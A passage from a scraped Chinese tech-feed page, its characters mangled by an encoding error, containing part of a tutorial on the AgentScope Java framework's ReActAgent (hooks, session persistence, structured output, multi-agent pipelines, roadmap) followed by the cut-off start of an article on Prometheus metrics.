Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">content</span>(TextBlock.<span class="hljs-built_in">builder</span>()
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">text</span>(<span class="hljs-string">"åŒ—äº¬ä»Šå¤©å¤©æ°”å¦‚ä½•ï¼Ÿ"</span>)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">build</span>())
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">build</span>()
)<span class="hljs-selector-class">.block</span>();
</code></pre>
<p>æ‰§è¡Œæµç¨‹ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">ç”¨æˆ·é—®é¢˜ï¼šåŒ—äº¬ä»Šå¤©å¤©æ°”å¦‚ä½•ï¼Ÿ
Â  Â  â†“
<span class="hljs-selector-attr">[æ¨ç†]</span>Â éœ€è¦æŸ¥å¤©æ°”ï¼Œå†³å®šè°ƒç”¨ <span class="hljs-built_in">getWeather</span>("åŒ—äº¬")
Â  Â  â†“
<span class="hljs-selector-attr">[è¡ŒåŠ¨]</span>Â æ‰§è¡Œå·¥å…· â†’ "åŒ—äº¬ï¼šæ™´å¤©ï¼Œæ°”æ¸©Â <span class="hljs-number">25</span>â„ƒ"
Â  Â  â†“
<span class="hljs-selector-attr">[æ¨ç†]</span>Â å·²è·å–ä¿¡æ¯ï¼Œç”Ÿæˆå›ç­”
Â  Â  â†“
å›ç­”ï¼šæ ¹æ®æŸ¥è¯¢ç»“æœï¼ŒåŒ—äº¬ä»Šå¤©æ™´å¤©ï¼Œæ°”æ¸©Â <span class="hljs-number">25</span>â„ƒ
</code></pre>
<h2 data-id="heading-12">ReActAgent æ ¸å¿ƒç‰¹æ€§</h2>
<p>é™¤äº†åŸºç¡€çš„ Reasoning å’Œ Acting èƒ½åŠ›ï¼ŒAgentScope çš„ ReActAgent è¿˜å…·å¤‡å¤šä¸ªç‰¹æ€§ã€‚</p>
<h3 data-id="heading-13">1. å¤šæ¨¡æ€æ¶ˆæ¯æ”¯æŒ</h3>
<p>ReActAgent å¯ä»¥å¤„ç†å¤šæ¨¡æ€è¾“å…¥ï¼Œä¸é™äºçº¯æ–‡æœ¬ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// åˆ›å»ºæ”¯æŒè§†è§‰çš„ ReActAgentï¼ˆä½¿ç”¨è§†è§‰æ¨¡å‹ï¼‰</span>
<span class="hljs-selector-tag">ReActAgent</span>Â <span class="hljs-selector-tag">visionAgent</span>Â =Â <span class="hljs-selector-tag">ReActAgent</span><span class="hljs-selector-class">.builder</span>()
Â  Â  <span class="hljs-selector-class">.name</span>(<span class="hljs-string">"VisionAssistant"</span>)
Â  Â  <span class="hljs-selector-class">.model</span>(DashScopeChatModel.<span class="hljs-built_in">builder</span>()
Â  Â  Â  Â  .<span class="hljs-built_in">apiKey</span>(System.<span class="hljs-built_in">getenv</span>(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>))
Â  Â  Â  Â  .<span class="hljs-built_in">modelName</span>(<span class="hljs-string">"qwen3-vl-plus"</span>) Â <span class="hljs-comment">// è§†è§‰æ¨¡å‹</span>
Â  Â  Â  Â  .<span class="hljs-built_in">build</span>())
Â  Â  <span class="hljs-selector-class">.build</span>();
<span class="hljs-comment">// å‘é€åŒ…å«å›¾ç‰‡çš„æ¶ˆæ¯</span>
<span class="hljs-selector-tag">Msg</span>Â <span class="hljs-selector-tag">response</span>Â =Â <span class="hljs-selector-tag">visionAgent</span><span class="hljs-selector-class">.call</span>(
Â  Â  Msg.<span class="hljs-built_in">builder</span>()
Â  Â  Â  Â  .<span class="hljs-built_in">role</span>(MsgRole.USER)
Â  Â  Â  Â  .<span class="hljs-built_in">content</span>(List.<span class="hljs-built_in">of</span>(
Â  Â  Â  Â  Â  Â  TextBlock.<span class="hljs-built_in">builder</span>().<span class="hljs-built_in">text</span>(<span class="hljs-string">"è¯·åˆ†æè¿™å¼ å›¾ç‰‡çš„å†…å®¹"</span>).<span class="hljs-built_in">build</span>(),
Â  Â  Â  Â  Â  Â  ImageBlock.<span class="hljs-built_in">builder</span>().<span class="hljs-built_in">source</span>(URLSource.<span class="hljs-built_in">builder</span>().url(<span class="hljs-string">"https://example.com/image.jpg"</span>).<span class="hljs-built_in">build</span>()).<span class="hljs-built_in">build</span>()
Â  Â  Â  Â  ))
Â  Â  Â  Â  .<span class="hljs-built_in">build</span>()
)<span class="hljs-selector-class">.block</span>();
</code></pre>
<p>æ”¯æŒçš„å¤šæ¨¡æ€å†…å®¹ç±»å‹ï¼šTextBlockã€ImageBlockã€AudioBlockã€VideoBlockã€‚</p>
<h3 data-id="heading-14">2. é’©å­æœºåˆ¶</h3>
<p>ä¸º ReActAgent æ·»åŠ é’©å­ï¼Œç›‘æ§å’Œæ‰©å±•å…¶è¡Œä¸ºã€‚è¿™é‡Œä»¥å‰æ–‡ä¸­ç”¨åˆ°çš„ WeatherAssistant ä¸ºä¾‹å­æ·»åŠ é’©å­ï¼Œå®æ—¶çœ‹åˆ°æ™ºèƒ½ä½“çš„æ€è€ƒå’Œæ‰§è¡Œè¿‡ç¨‹ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">// å®šä¹‰è°ƒè¯•é’©å­ï¼Œæ˜¾ç¤ºå®Œæ•´çš„ ReAct æ‰§è¡Œè¿‡ç¨‹
Hook debugHook = <span class="hljs-built_in">new</span> Hook() {
Â  Â  @Override
Â  Â  <span class="hljs-keyword">public</span> &lt;T extends HookEvent&gt; Mono&lt;T&gt; onEvent(T <span class="hljs-keyword">event</span>) {
Â  Â  Â  Â Â <span class="hljs-keyword">try</span>Â {
Â  Â  Â  Â  Â  Â  switch (<span class="hljs-keyword">event</span>) {
Â  Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">case</span>Â PreReasoningEvent e -&gt; {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  System.out.println(<span class="hljs-string">"\n[æ¨ç†] æ™ºèƒ½ä½“å¼€å§‹æ€è€ƒ..."</span>);
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">case</span>Â PostReasoningEvent e -&gt; {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  System.out.println(<span class="hljs-string">"[æ¨ç†] æ¨ç†ç»“æœï¼š"</span>Â + <span class="hljs-built_in">new</span> ObjectMapper().writeValueAsString(e.getReasoningMessage()));
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">case</span>Â PostActingEvent e -&gt; {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  System.out.println(<span class="hljs-string">"[è¡ŒåŠ¨] æ‰§è¡Œå·¥å…· â†’ "</span>Â + <span class="hljs-built_in">new</span> ObjectMapper().writeValueAsString(e.getToolResult()));
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">case</span>Â PostCallEvent e -&gt; {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  System.out.println(<span class="hljs-string">"[æ¨ç†] å·²è·å–ä¿¡æ¯ï¼Œç”Ÿæˆå›ç­”"</span>);
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  System.out.println(<span class="hljs-string">"å›ç­”ï¼š"</span>Â + e.getFinalMessage().getTextContent());
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">default</span> -&gt; {}
Â  Â  Â  Â  Â  Â  } ;
Â  Â  Â  Â  } <span class="hljs-keyword">catch</span> (JsonProcessingException e) {
Â  Â  Â  Â  Â  Â  ...
Â  Â  Â  Â  }
Â  Â  Â  Â Â <span class="hljs-keyword">return</span>Â Mono.just(<span class="hljs-keyword">event</span>);
Â  Â  }
};
// å°†é’©å­æ·»åŠ åˆ° WeatherAssistant
ReActAgent weatherAgent = ReActAgent.builder()
Â  Â  .name(<span class="hljs-string">"WeatherAssistant"</span>)
Â  Â  .sysPrompt(<span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªå¤©æ°”åŠ©æ‰‹ï¼Œå¯ä»¥æŸ¥è¯¢åŸå¸‚å¤©æ°”ä¿¡æ¯ã€‚"</span>)
Â  Â  .model(DashScopeChatModel.builder()
Â  Â  Â  Â  Â  Â .apiKey(System.getenv(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>))
Â  Â  Â  Â  Â  Â .modelName(<span class="hljs-string">"qwen3-max"</span>)
Â  Â  Â  Â  Â  Â .build())
Â  Â  .toolkit(toolkit) // å‰æ–‡ä¸­å®šä¹‰çš„ Toolkit
Â  Â  .hook(debugHook) Â // æ·»åŠ è°ƒè¯•é’©å­
Â  Â  .build();
// æŸ¥è¯¢å¤©æ°”
Msg response = weatherAgent.<span class="hljs-keyword">call</span>(
Â  Â  Msg.builder()
Â  Â  .role(MsgRole.USER)
Â  Â  .content(TextBlock.builder()
Â  Â  Â  Â  Â  Â  Â .<span class="hljs-keyword">text</span>(<span class="hljs-string">"åŒ—äº¬ä»Šå¤©å¤©æ°”å¦‚ä½•ï¼Ÿ"</span>)
Â  Â  Â  Â  Â  Â  Â .build())
Â  Â  .build()
).block();
// è¾“å‡ºç¤ºä¾‹ï¼š
// [æ¨ç†] æ™ºèƒ½ä½“å¼€å§‹æ€è€ƒ...
// [æ¨ç†] æ¨ç†ç»“æœï¼š{<span class="hljs-string">"id"</span>:<span class="hljs-string">"xxx"</span>,<span class="hljs-string">"name"</span>:<span class="hljs-string">"WeatherAssistant"</span>,<span class="hljs-string">"role"</span>:<span class="hljs-string">"ASSISTANT"</span>,<span class="hljs-string">"content"</span>:[{<span class="hljs-string">"type"</span>:<span class="hljs-string">"tool_use"</span>,<span class="hljs-string">"id"</span>:<span class="hljs-string">"call_xxx"</span>,<span class="hljs-string">"name"</span>:<span class="hljs-string">"getWeather"</span>,<span class="hljs-string">"input"</span>:{<span class="hljs-string">"city"</span>:<span class="hljs-string">"åŒ—äº¬"</span>},<span class="hljs-string">"content"</span>:null}],<span class="hljs-string">"metadata"</span>:null,<span class="hljs-string">"timestamp"</span>:<span class="hljs-string">"xxx"</span>}
// [è¡ŒåŠ¨] æ‰§è¡Œå·¥å…· â†’ {<span class="hljs-string">"type"</span>:<span class="hljs-string">"tool_result"</span>,<span class="hljs-string">"id"</span>:<span class="hljs-string">"call_xxx"</span>,<span class="hljs-string">"name"</span>:<span class="hljs-string">"getWeather"</span>,<span class="hljs-string">"output"</span>:[{<span class="hljs-string">"type"</span>:<span class="hljs-string">"text"</span>,<span class="hljs-string">"text"</span>:<span class="hljs-string">"\"</span>åŒ—äº¬ï¼šæ™´å¤©ï¼Œæ°”æ¸© <span class="hljs-number">25</span> â„ƒ\<span class="hljs-string">""</span>}],<span class="hljs-string">"metadata"</span>:{}}
// [æ¨ç†] æ™ºèƒ½ä½“å¼€å§‹æ€è€ƒ...
// [æ¨ç†] æ¨ç†ç»“æœï¼š{<span class="hljs-string">"id"</span>:<span class="hljs-string">"xxx"</span>,<span class="hljs-string">"name"</span>:<span class="hljs-string">"WeatherAssistant"</span>,<span class="hljs-string">"role"</span>:<span class="hljs-string">"ASSISTANT"</span>,<span class="hljs-string">"content"</span>:[{<span class="hljs-string">"type"</span>:<span class="hljs-string">"text"</span>,<span class="hljs-string">"text"</span>:<span class="hljs-string">"åŒ—äº¬ä»Šå¤©å¤©æ°”æ™´æœ—ï¼Œæ°”æ¸©ä¸º25â„ƒã€‚å»ºè®®å¤–å‡ºæ—¶æ³¨æ„é˜²æ™’ï¼Œç¥æ‚¨æ‹¥æœ‰æ„‰å¿«çš„ä¸€å¤©ï¼"</span>}],<span class="hljs-string">"metadata"</span>:null,<span class="hljs-string">"timestamp"</span>:<span class="hljs-string">"xxx"</span>}
// [æ¨ç†] å·²è·å–ä¿¡æ¯ï¼Œç”Ÿæˆå›ç­”
// å›ç­”ï¼šåŒ—äº¬ä»Šå¤©å¤©æ°”æ™´æœ—ï¼Œæ°”æ¸©ä¸º<span class="hljs-number">25</span>â„ƒã€‚å»ºè®®å¤–å‡ºæ—¶æ³¨æ„é˜²æ™’ï¼Œç¥æ‚¨æ‹¥æœ‰æ„‰å¿«çš„ä¸€å¤©ï¼
</code></pre>
<h3 data-id="heading-15">3. ä¼šè¯æŒä¹…åŒ–</h3>
<p>ä¿å­˜å’Œæ¢å¤ ReActAgent çš„çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// åˆ›å»º ReActAgent</span>
ReActAgentÂ agentÂ =Â ReActAgent<span class="hljs-selector-class">.builder</span>()
Â  Â  <span class="hljs-selector-class">.name</span>("PersistentAgent")
Â  Â  <span class="hljs-selector-class">.model</span>(DashScopeChatModel.builder()
Â  Â  Â  Â  <span class="hljs-selector-class">.apiKey</span>(System.getenv("DASHSCOPE_API_KEY"))
Â  Â  Â  Â  <span class="hljs-selector-class">.modelName</span>("qwen3-max")
Â  Â  Â  Â  <span class="hljs-selector-class">.build</span>())
Â  Â  <span class="hljs-selector-class">.memory</span>(newÂ InMemoryMemory())
Â  Â  <span class="hljs-selector-class">.build</span>();
<span class="hljs-comment">// ä¿å­˜ä¼šè¯</span>
SessionManager<span class="hljs-selector-class">.forSessionId</span>("session-<span class="hljs-number">001</span>")
Â  Â  <span class="hljs-selector-class">.withJsonSession</span>(Path.of("./sessions"))
Â  Â  <span class="hljs-selector-class">.addComponent</span>(agent)
Â  Â  <span class="hljs-selector-class">.saveSession</span>();
<span class="hljs-comment">// ä¸‹æ¬¡å¯åŠ¨æ—¶æ¢å¤</span>
SessionManager<span class="hljs-selector-class">.forSessionId</span>("session-<span class="hljs-number">001</span>")
Â  Â  <span class="hljs-selector-class">.withJsonSession</span>(Path.of("./sessions"))
Â  Â  <span class="hljs-selector-class">.addComponent</span>(agent)
Â  Â  <span class="hljs-selector-class">.loadIfExists</span>();
<span class="hljs-comment">// agent ç°åœ¨æ¢å¤åˆ°äº†ä¹‹å‰çš„çŠ¶æ€ï¼Œå¯ä»¥ç»§ç»­å¯¹è¯</span>
</code></pre>
<h3 data-id="heading-16">4. ç»“æ„åŒ–è¾“å‡º</h3>
<p>è®© ReActAgent è¿”å›ç±»å‹å®‰å…¨çš„ç»“æ„åŒ–æ•°æ®ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// å®šä¹‰è¾“å‡ºç»“æ„</span>
<span class="hljs-keyword">public</span>Â <span class="hljs-keyword">class</span>Â <span class="hljs-title class_">WeatherReport</span>Â {
Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-type">String</span> city;
Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-type">int</span>Â temperature;
Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-type">String</span> condition;
Â  Â Â <span class="hljs-keyword">public</span>Â List&lt;<span class="hljs-type">String</span>&gt; suggestions;
}
<span class="hljs-comment">// ReActAgent è°ƒç”¨æ—¶æŒ‡å®šè¾“å‡ºç±»å‹</span>
Msg response = agent.<span class="hljs-built_in">call</span>(
Â  Â  Msg.<span class="hljs-built_in">builder</span>()
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">role</span>(MsgRole.USER)
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">content</span>(TextBlock.<span class="hljs-built_in">builder</span>()
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">text</span>(<span class="hljs-string">"åˆ†æåŒ—äº¬çš„å¤©æ°”å¹¶ç»™å‡ºå»ºè®®"</span>)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">build</span>())
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-built_in">build</span>(),
Â  Â  WeatherReport.<span class="hljs-keyword">class</span>Â Â <span class="hljs-comment">// æŒ‡å®šç»“æ„åŒ–è¾“å‡ºç±»å‹</span>
).<span class="hljs-built_in">block</span>();
<span class="hljs-comment">// æå–ç»“æ„åŒ–æ•°æ®</span>
WeatherReport report = response.<span class="hljs-built_in">getStructuredData</span>(WeatherReport.<span class="hljs-keyword">class</span>);
System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"åŸå¸‚: "</span>Â + report.city);
System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"æ¸©åº¦: "</span>Â + report.temperature);
</code></pre>
<p>é¿å…äº†æ–‡æœ¬è§£æçš„ä¸ç¡®å®šæ€§ï¼Œç¼–è¯‘æœŸå°±èƒ½å‘ç°ç±»å‹é”™è¯¯ã€‚</p>
<h3 data-id="heading-17">5. å¤šæ™ºèƒ½ä½“åä½œ</h3>
<p>å¤šä¸ª ReActAgent å¯ä»¥é€šè¿‡ Pipeline åä½œï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// åˆ›å»ºæ¨¡å‹é…ç½®</span>
DashScopeChatModelÂ modelÂ =Â DashScopeChatModel<span class="hljs-selector-class">.builder</span>()
Â  Â  <span class="hljs-selector-class">.apiKey</span>(System.getenv("DASHSCOPE_API_KEY"))
Â  Â  <span class="hljs-selector-class">.modelName</span>("qwen3-max")
Â  Â  <span class="hljs-selector-class">.build</span>();
<span class="hljs-comment">// åˆ›å»ºå¤šä¸ª ReActAgent</span>
ReActAgentÂ dataCollectorÂ =Â ReActAgent<span class="hljs-selector-class">.builder</span>()
Â  Â  <span class="hljs-selector-class">.name</span>("DataCollector")
Â  Â  <span class="hljs-selector-class">.model</span>(model)
Â  Â  <span class="hljs-selector-class">.build</span>();
ReActAgentÂ dataAnalyzerÂ =Â ReActAgent<span class="hljs-selector-class">.builder</span>()
Â  Â  <span class="hljs-selector-class">.name</span>("DataAnalyzer")
Â  Â  <span class="hljs-selector-class">.model</span>(model)
Â  Â  <span class="hljs-selector-class">.build</span>();
ReActAgentÂ reportGeneratorÂ =Â ReActAgent<span class="hljs-selector-class">.builder</span>()
Â  Â  <span class="hljs-selector-class">.name</span>("ReportGenerator")
Â  Â  <span class="hljs-selector-class">.model</span>(model)
Â  Â  <span class="hljs-selector-class">.build</span>();
<span class="hljs-comment">// é¡ºåºæ‰§è¡Œï¼šæ™ºèƒ½ä½“ä¾æ¬¡å¤„ç†</span>
MsgÂ resultÂ =Â Pipelines<span class="hljs-selector-class">.sequential</span>(
Â  Â  List.of(dataCollector, dataAnalyzer, reportGenerator),
Â  Â  inputMsg
)<span class="hljs-selector-class">.block</span>();
<span class="hljs-comment">// å¹¶è¡Œæ‰§è¡Œï¼šå¤šä¸ªæ™ºèƒ½ä½“åŒæ—¶å¤„ç†</span>
List&lt;Msg&gt; results = Pipelines<span class="hljs-selector-class">.fanout</span>(
Â  Â  List.of(dataCollector, dataAnalyzer, reportGenerator),Â 
Â  Â  inputMsg
)<span class="hljs-selector-class">.block</span>();
</code></pre>
<h2 data-id="heading-18">Roadmap</h2>
<p>AgentScope Java è‡ª 2025 å¹´ 9 æœˆå¼€æºä»¥æ¥ï¼Œå½“å‰ v0.2 ç‰ˆæœ¬å·²å…·å¤‡ ReActAgent æ ¸å¿ƒèƒ½åŠ›ã€‚</p>
<p>æˆ‘ä»¬è®¡åˆ’äº 11 æœˆåº•å‘å¸ƒ v1.0 ç‰ˆæœ¬ï¼Œå±Šæ—¶å°†æ–°å¢ RAGã€Planã€Tracingã€Evaluation åŠ Studio ç­‰å…¨å¥—åŠŸèƒ½ï¼Œæ ‡å¿—ç€æ¡†æ¶æ­£å¼ç”Ÿäº§å¯ç”¨ï¼›Runtime v1.0 ä¹Ÿå°†åŒæ­¥ä¸Šçº¿ï¼Œæä¾›æ¶µç›–å®‰å…¨æ²™ç®±ã€A2A Agent åœ¨å†…çš„ä¼ä¸šçº§è½åœ°æ–¹æ¡ˆã€‚éšååœ¨ 12 æœˆï¼Œæˆ‘ä»¬å°†è¿›ä¸€æ­¥æ¨å‡ºåŸºäº ReMe çš„ä¸Šä¸‹æ–‡ç®¡ç†ä¸åŸºäº Trinity-RFT çš„å¼ºåŒ–å­¦ä¹ æœ€ä½³å®è·µã€‚</p>
<p>åœ¨æŠ€æœ¯æ¼”è¿›å±‚é¢ï¼Œæˆ‘ä»¬æ­£æŒç»­æ¢ç´¢æ›´é«˜æ•ˆã€æ™ºèƒ½çš„ä¸Šä¸‹æ–‡å·¥ç¨‹ä¸å¤š Agent ååŒèŒƒå¼ï¼Œè‡´åŠ›äºæ”¯æ’‘æ›´å¼ºå¤§çš„ AI åº”ç”¨æ„å»ºã€‚æ­¤å¤–ï¼Œé’ˆå¯¹ Agent æµé‡å‘ˆç°çš„â€œäºŒå…«å®šå¾‹â€ç‰¹å¾ï¼ˆå¤´éƒ¨ 20% çš„ Agent æ‰¿è½½äº† 80% çš„æµé‡ï¼‰ï¼Œæˆ‘ä»¬åœ¨æ¶æ„ä¸Šå…¨åŠ›æ¨è¿› Serverless åŒ–ï¼Œé€šè¿‡å®ç°æ¯«ç§’çº§å†·å¯åŠ¨ä¸æ··åˆéƒ¨ç½²ï¼Œå¸®åŠ©å¼€å‘è€…åœ¨åº”å¯¹é«˜å¹¶å‘çš„åŒæ—¶ï¼Œæ˜¾è‘—é™ä½éƒ¨ç½²æˆæœ¬å¹¶æå‡æ•ˆç‡ã€‚</p>
<h2 data-id="heading-19">æœªå®Œå¾…ç»­</h2>
<p>æœ¬æ–‡ä½œä¸º AgentScope Java ç³»åˆ—æ¨æ–‡çš„é¦–ç¯‡ï¼Œå—ç¯‡å¹…é™åˆ¶åªèƒ½æŠ›ç –å¼•ç‰ï¼Œåœ¨æ¥ä¸‹æ¥è¿˜ä¼šæœ‰æ›´å¤šçš„å¹²è´§ï¼š</p>
<ol>
<li>AgentScope Runtimeï¼šå¸®åŠ©å¼€å‘è€…å®ç° Agent åº”ç”¨ä» 1 åˆ° 100ï¼Œæä¾›å·¥å…·è¿è¡Œæ²™ç®±ã€A2A åè®®ã€è¿œç¨‹éƒ¨ç½²ç­‰å¼ºå¤§èƒ½åŠ›ã€‚</li>
<li>Agent å¼€å‘èŒƒå¼è®¨è®ºï¼šWorkflow or Agenticï¼ŸAgentScope åŸºäºç‹¼äººæ€æ¸¸æˆçš„ Agent å®è·µåˆ†äº«ã€‚</li>
<li>Meta Toolï¼šé¢å¯¹æ—¥ç›Šè†¨èƒ€çš„ Tool Definitionï¼ŒAgentScope çš„è§£å†³æ–¹æ¡ˆã€‚</li>
<li>Planï¼šä½¿ Agent èƒ½å¤Ÿè‡ªä¸»æ‹†è§£å¤æ‚ä»»åŠ¡å¹¶ç³»ç»Ÿæ€§åœ°æ‰§è¡Œã€‚</li>
</ol>
<p>å¦‚æœä½ è§‰å¾— AgentScope Java ä¸é”™ï¼Œæ¬¢è¿ç»™æˆ‘ä»¬çš„é¡¹ç›® Star~<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagentscope-ai%2Fagentscope-java" target="_blank" title="https://github.com/agentscope-ai/agentscope-java" ref="nofollow noopener noreferrer">github.com/agentscope-â€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å››ä¸ªæŒ‡æ ‡ï¼Œä¸€ç§å“²å­¦ï¼šPrometheus å¦‚ä½•ç”¨ç®€å•æ¨¡å‹çœ‹é€å¤æ‚ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7589146208225296420</link>    <guid>https://juejin.cn/post/7589146208225296420</guid>    <pubDate>2025-12-29T05:29:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589146208225296420" data-draft-id="7588570963294519339" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å››ä¸ªæŒ‡æ ‡ï¼Œä¸€ç§å“²å­¦ï¼šPrometheus å¦‚ä½•ç”¨ç®€å•æ¨¡å‹çœ‹é€å¤æ‚ç³»ç»Ÿ"/> <meta itemprop="keywords" content="åç«¯,æ¶æ„,Go"/> <meta itemprop="datePublished" content="2025-12-29T05:29:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¸æµªæ— ç—•"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å››ä¸ªæŒ‡æ ‡ï¼Œä¸€ç§å“²å­¦ï¼šPrometheus å¦‚ä½•ç”¨ç®€å•æ¨¡å‹çœ‹é€å¤æ‚ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¸æµªæ— ç—•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T05:29:53.000Z" title="Mon Dec 29 2025 05:29:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»34åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item 